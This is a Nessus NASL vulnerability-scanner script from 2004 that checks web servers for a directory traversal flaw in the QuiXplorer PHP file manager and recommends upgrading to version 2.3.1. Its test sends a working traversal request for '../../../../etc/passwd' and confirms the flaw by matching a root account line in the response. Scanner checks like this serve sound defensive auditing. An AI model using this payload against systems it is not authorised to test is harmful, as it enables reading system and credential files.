#
# This script was written by Noam Rathaus
#
# GPL
#
# Contact: Cyrille Barthelemy <cb-lse@ifrance.com>
# Subject: QuiXplorer directory traversal
# Date: 	14.8.2004 13:03

if(description)
{
 script_id(14275);
 script_bugtraq_id(10949);
 script_version("$Revision: 1.5 $");
 script_name(english:"QuiXplorer Directory Traversal");
 
 
 desc["english"] = "
The remote host is running the QuiXplorer CGI suite, a file manager
for websites written in PHP.

There is a floaw in the remote version of this CGI which makes it vulnerable 
to a directory traversal bug.  

This could, for instance, lead to an attacker downloading the /etc/passwd file.

Solution : Upgrade to version 2.3.1 -  http://quixplorer.sourceforge.net/
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for the QuiXplorer Directory traversal";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "Misc.";
 script_family(english:family["english"]);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 path = string(dir, "/quixplorer_2_3/index.php?action=download&dir=&item=../../../../../../../../../etc/passwd&order=name&srt=yes");
 req = http_get(item: path, port:port);

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);

 if ( egrep ( pattern:".*root:.*:0:[01]:.*", string:res) )
 {
	security_hole(port);
	exit(0);
 }
}

